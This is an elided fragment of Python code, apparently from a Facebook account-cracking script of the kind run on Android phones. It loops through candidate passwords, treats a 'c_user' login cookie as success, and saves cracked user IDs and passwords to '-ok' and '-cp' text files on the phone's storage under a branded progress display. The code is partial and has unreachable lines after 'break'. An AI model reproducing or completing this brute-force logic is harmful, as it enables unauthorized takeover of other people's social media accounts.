    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[65:80]
                print('[CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/𝐒𝐔𝐘𝐀𝐈𝐅-cp.txt', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46m𝐒𝐔𝐘𝐀𝐈𝐅\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
